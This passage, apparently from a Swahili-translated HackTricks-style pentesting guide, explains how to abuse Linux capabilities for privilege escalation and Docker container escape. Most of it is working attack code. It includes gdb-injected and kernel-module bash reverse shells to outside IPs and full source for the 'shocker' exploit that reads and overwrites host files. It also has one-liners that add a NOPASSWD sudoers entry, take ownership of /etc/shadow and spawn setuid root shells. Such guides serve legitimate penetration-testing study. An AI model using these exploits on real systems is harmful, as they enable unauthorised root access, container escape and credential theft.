gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Hutaweza kuona matokeo ya amri iliyotekelezwa lakini itatekelezwa na mchakato huo (hivyo pata rev shell).

{% hint style="warning" %}
Ikiwa unapata kosa "No symbol "system" in current context." angalia mfano wa awali wa kupakia shellcode katika programu kupitia gdb.
{% endhint %}

**Mfano na mazingira (Docker breakout) - Shellcode Injection**

Unaweza kuangalia uwezo ulioanzishwa ndani ya kontena la docker kwa kutumia:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
List **processes** running in the **host** `ps -eaf`

1. Get the **architecture** `uname -m`
2. Find a **shellcode** for the architecture ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Find a **program** to **inject** the **shellcode** into a process memory ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
4. **Modify** the **shellcode** inside the program and **compile** it `gcc inject.c -o inject`
5. **Inject** it and grab your **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP\_SYS\_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** inaruhusu mchakato **kuchoma na kuondoa moduli za kernel (`init_module(2)`, `finit_module(2)` na `delete_module(2)` system calls)**, ikitoa ufikiaji wa moja kwa moja kwa operesheni kuu za kernel. Uwezo huu unatoa hatari kubwa za usalama, kwani unaruhusu kupanda kwa mamlaka na kuathiri mfumo mzima kwa kuruhusu mabadiliko kwenye kernel, hivyo kupita mitambo yote ya usalama ya Linux, ikiwa ni pamoja na Moduli za Usalama za Linux na kutengwa kwa kontena.  
**Hii inamaanisha kwamba unaweza** **kuingiza/kuondoa moduli za kernel katika/katika kernel ya mashine mwenyeji.**

**Mfano na binary**

Katika mfano ufuatao, binary **`python`** ina uwezo huu.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Kwa default, amri ya **`modprobe`** inakagua orodha ya utegemezi na faili za ramani katika saraka **`/lib/modules/$(uname -r)`**.\
Ili kutumia hii vibaya, hebu tuunde folda ya uwongo ya **lib/modules**:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Kisha **unda moduli ya kernel ambayo unaweza kupata mifano 2 hapa chini na nakala** yake kwenye folda hii:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Hatimaye, tekeleza msimbo wa python unaohitajika kupakia moduli hii ya kernel:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Mfano wa 2 na binary**

Katika mfano ufuatao, binary **`kmod`** ina uwezo huu.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Ambayo inamaanisha kwamba inawezekana kutumia amri **`insmod`** kuingiza moduli ya kernel. Fuata mfano hapa chini kupata **reverse shell** ukitumia haki hii.

**Mfano na mazingira (Docker breakout)**

Unaweza kuangalia uwezo ulioanzishwa ndani ya kontena la docker kwa kutumia:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Ndani ya matokeo ya awali unaweza kuona kwamba uwezo wa **SYS\_MODULE** umewezeshwa.

**Unda** **moduli ya kernel** ambayo itatekeleza shell ya nyuma na **Makefile** ili **kuunda** hiyo:

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% endcode %}

{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
Karakteri tupu kabla ya kila neno la make katika Makefile **lazima iwe tab, si nafasi**!
{% endhint %}

Tekeleza `make` ili kuunda.
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Hatimaye, anzisha `nc` ndani ya shell na **pakia moduli** kutoka nyingine na utaweza kukamata shell katika mchakato wa nc:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Msimbo wa mbinu hii ulikopwa kutoka maabara ya "Kutatiza Uwezo wa SYS\_MODULE" kutoka** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Mfano mwingine wa mbinu hii unaweza kupatikana katika [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) inaruhusu mchakato **kuzidi ruhusa za kusoma faili na za kusoma na kutekeleza saraka**. Matumizi yake makuu ni kwa ajili ya kutafuta au kusoma faili. Hata hivyo, inaruhusu pia mchakato kutumia kazi ya `open_by_handle_at(2)`, ambayo inaweza kufikia faili yoyote, ikiwa ni pamoja na zile za nje ya eneo la mchakato. Kifaa kinachotumika katika `open_by_handle_at(2)` kinapaswa kuwa kitambulisho kisichokuwa wazi kilichopatikana kupitia `name_to_handle_at(2)`, lakini kinaweza kujumuisha taarifa nyeti kama nambari za inode ambazo zinaweza kuathiriwa. Uwezekano wa kutumia uwezo huu, hasa katika muktadha wa kontena za Docker, ulionyeshwa na Sebastian Krahmer kwa kutumia exploit ya shocker, kama ilivyochambuliwa [hapa](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
**Hii inamaanisha kwamba unaweza** **kuzidi kuangalia ruhusa za kusoma faili na kuangalia ruhusa za kusoma/kutekeleza saraka.**

**Mfano na binary**

Binary itakuwa na uwezo wa kusoma faili yoyote. Hivyo, ikiwa faili kama tar ina uwezo huu itakuwa na uwezo wa kusoma faili la kivuli:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Mfano na binary2**

Katika kesi hii, hebu tuone kwamba **`python`** binary ina uwezo huu. Ili orodhesha faili za root unaweza kufanya:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Na ili kusoma faili unaweza kufanya:
```python
print(open("/etc/shadow", "r").read())
```
**Mfano katika Mazingira (Docker breakout)**

Unaweza kuangalia uwezo ulioanzishwa ndani ya kontena la docker kwa kutumia:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Inside the previous output you can see that the **DAC\_READ\_SEARCH** capability is enabled. As a result, the container can **debug processes**.

You can learn how the following exploiting works in [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) but in resume **CAP\_DAC\_READ\_SEARCH** sio tu inatuwezesha kupita kwenye mfumo wa faili bila ukaguzi wa ruhusa, bali pia inafuta waziwazi ukaguzi wowote wa _**open\_by\_handle\_at(2)**_ na **inaweza kuruhusu mchakato wetu kufikia faili nyeti zilizo funguliwa na michakato mingine**.

The original exploit that abuse this permissions to read files from the host can be found here: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), the following is a **modified version that allows you to indicate the file you want to read as first argument and dump it in a file.**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
Exploiti inahitaji kupata kiashiria kwa kitu kilichowekwa kwenye mwenyeji. Exploiti ya awali ilitumia faili /.dockerinit na toleo hili lililobadilishwa linatumia /etc/hostname. Ikiwa exploiti haifanyi kazi labda unahitaji kuweka faili tofauti. Ili kupata faili ambayo imewekwa kwenye mwenyeji tekeleza amri ya mount:
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**Msimbo wa mbinu hii ulikopwa kutoka maabara ya "Abusing DAC\_READ\_SEARCH Capability" kutoka** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) ni tukio muhimu zaidi la usalama wa mtandao nchini **Hispania** na moja ya muhimu zaidi barani **Ulaya**. Kwa **lengo la kukuza maarifa ya kiufundi**, kongamano hili ni mahali pa kukutana kwa wataalamu wa teknolojia na usalama wa mtandao katika kila taaluma.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**Hii inamaanisha kwamba unaweza kupita ukaguzi wa ruhusa za kuandika kwenye faili yoyote, hivyo unaweza kuandika faili yoyote.**

Kuna faili nyingi ambazo unaweza **kufuta ili kupandisha mamlaka,** [**unaweza kupata mawazo kutoka hapa**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Mfano na binary**

Katika mfano huu vim ina uwezo huu, hivyo unaweza kubadilisha faili yoyote kama _passwd_, _sudoers_ au _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Mfano na binary 2**

Katika mfano huu, **`python`** binary itakuwa na uwezo huu. Unaweza kutumia python kubadilisha faili yoyote:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Mfano na mazingira + CAP\_DAC\_READ\_SEARCH (Docker breakout)**

Unaweza kuangalia uwezo ulioanzishwa ndani ya kontena la docker kwa kutumia:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Kwanza, soma sehemu ya awali ambayo [**inatumia uwezo wa DAC\_READ\_SEARCH kusoma faili za kawaida**](linux-capabilities.md#cap\_dac\_read\_search) za mwenyeji na **kusanya** exploit.\
Kisha, **kusanya toleo linalofuata la exploit ya shocker** ambalo litakuruhusu **kuandika faili za kawaida** ndani ya mfumo wa faili wa wenyeji:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Ili kutoroka kwenye kontena la docker unaweza **kupakua** faili `/etc/shadow` na `/etc/passwd` kutoka kwa mwenyeji, **ongeza** mtumiaji **mpya**, na utumie **`shocker_write`** kuandika upya. Kisha, **fikia** kupitia **ssh**.

**Msimbo wa mbinu hii ulikopiwa kutoka maabara ya "Kunyanyasa Uwezo wa DAC\_OVERRIDE" kutoka** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**Hii ina maana kwamba inawezekana kubadilisha umiliki wa faili yoyote.**

**Mfano na binary**

Tuchukulie kwamba binary ya **`python`** ina uwezo huu, unaweza **kubadilisha** **mmiliki** wa faili la **shadow**, **badilisha nenosiri la root**, na kupandisha haki:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Au na **`ruby`** binary ikiwa na uwezo huu:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**Hii inamaanisha kwamba inawezekana kubadilisha ruhusa za faili yoyote.**

**Mfano na binary**

Ikiwa python ina uwezo huu unaweza kubadilisha ruhusa za faili la kivuli, **badilisha nenosiri la root**, na kuongeza mamlaka:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**Hii inamaanisha kwamba inawezekana kuweka kitambulisho cha mtumiaji kilichofanywa kazi ya mchakato ulioanzishwa.**

**Mfano na binary**

Ikiwa python ina hii **uwezo**, unaweza kuitumia kwa urahisi kuboresha mamlaka hadi root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Njia nyingine:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**Hii inamaanisha kwamba inawezekana kuweka kitambulisho cha kundi kinachofanya kazi cha mchakato ulioanzishwa.**

Kuna faili nyingi ambazo unaweza **kuandika upya ili kupandisha mamlaka,** [**unaweza kupata mawazo kutoka hapa**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Mfano na binary**

Katika kesi hii unapaswa kutafuta faili za kuvutia ambazo kundi linaweza kusoma kwa sababu unaweza kujifanya kuwa kundi lolote:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Mara tu unapopata faili unayoweza kutumia (kupitia kusoma au kuandika) ili kupandisha hadhi, unaweza **kupata shell ukijifanya kuwa kundi la kuvutia** kwa:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
Katika kesi hii, kundi la shadow lilijitambulisha ili uweze kusoma faili `/etc/shadow`:
```bash
cat /etc/shadow
```
Ikiwa **docker** imewekwa unaweza **kujifanya** kuwa **kikundi cha docker** na kuitumia kuwasiliana na [**docker socket** na kupandisha mamlaka](./#writable-docker-socket).

## CAP\_SETFCAP

**Hii inamaanisha kwamba inawezekana kuweka uwezo kwenye faili na michakato**

**Mfano na binary**

Ikiwa python ina **uwezo** huu, unaweza kwa urahisi kuitumia kupandisha mamlaka hadi root:

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% endcode %}
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
Kumbuka kwamba ikiwa utaweka uwezo mpya kwa binary na CAP\_SETFCAP, utapoteza uwezo huu.
{% endhint %}

Mara tu unapo kuwa na [SETUID capability](linux-capabilities.md#cap\_setuid) unaweza kwenda kwenye sehemu yake kuona jinsi ya kupandisha mamlaka.

**Mfano na mazingira (Docker breakout)**

Kwa default uwezo **CAP\_SETFCAP unatolewa kwa mchakato ndani ya kontena katika Docker**. Unaweza kuangalia hilo kwa kufanya kitu kama:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Hii uwezo inaruhusu **kutoa uwezo mwingine wowote kwa binaries**, hivyo tunaweza kufikiria kuhusu **kutoroka** kutoka kwenye kontena **kwa kutumia mojawapo ya uwezo mwingine wa kuvunja** ulioelezwa kwenye ukurasa huu.\
Hata hivyo, ukijaribu kutoa kwa mfano uwezo CAP\_SYS\_ADMIN na CAP\_SYS\_PTRACE kwa binary ya gdb, utagundua kwamba unaweza kuwapa, lakini **binary haitakuwa na uwezo wa kutekeleza baada ya hii**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: Hii ni **seti ya mipaka kwa uwezo halisi** ambao thread inaweza kuchukua. Pia ni seti ya mipaka kwa uwezo ambao unaweza kuongezwa kwenye seti ya kurithiwa na thread ambayo **haina uwezo wa CAP\_SETPCAP** katika seti yake halisi._\
Inaonekana kama uwezo wa Permitted unaleta mipaka kwa wale wanaoweza kutumika.\
Hata hivyo, Docker pia inatoa **CAP\_SETPCAP** kwa chaguo-msingi, hivyo unaweza kuwa na uwezo wa **kuweka uwezo mpya ndani ya wale wa kurithiwa**.\
Hata hivyo, katika hati ya uwezo huu: _CAP\_SETPCAP : \[…] **ongeza uwezo wowote kutoka kwenye seti ya mipaka ya thread inayopiga** kwa seti yake ya kurithiwa_.\
Inaonekana kama tunaweza kuongeza tu kwenye seti ya kurithiwa uwezo kutoka kwenye seti ya mipaka. Hii inamaanisha kwamba **hatuwezi kuweka uwezo mpya kama CAP\_SYS\_ADMIN au CAP\_SYS\_PTRACE katika seti ya kurithiwa ili kupandisha hadhi**.

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) inatoa idadi ya operesheni nyeti ikiwa ni pamoja na ufikiaji wa `/dev/mem`, `/dev/kmem` au `/proc/kcore`, kubadilisha `mmap_min_addr`, ufikiaji wa `ioperm(2)` na `iopl(2)` system calls, na amri mbalimbali za diski. `FIBMAP ioctl(2)` pia inaruhusiwa kupitia uwezo huu, ambao umesababisha matatizo katika [zamani](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Kulingana na ukurasa wa man, hii pia inaruhusu mwenye uwezo kufanya `perform a range of device-specific operations on other devices`.

Hii inaweza kuwa na manufaa kwa **kupandisha hadhi** na **Docker breakout.**

## CAP\_KILL

**Hii inamaanisha kwamba inawezekana kuua mchakato wowote.**

**Mfano na binary**

Tuchukulie kwamba **`python`** binary ina uwezo huu. Ikiwa ungeweza **pia kubadilisha baadhi ya huduma au usanidi wa socket** (au faili lolote la usanidi linalohusiana na huduma) faili, unaweza kuingiza nyuma, na kisha kuua mchakato unaohusiana na huduma hiyo na kusubiri faili mpya ya usanidi kutekelezwa na nyuma yako.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc na kill**

Ikiwa una uwezo wa kill na kuna **programu ya node inayoendesha kama root** (au kama mtumiaji tofauti) unaweza labda **kutuma** ishara **SIGUSR1** na kuifanya **ifungue debuggger ya node** ambapo unaweza kuungana.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

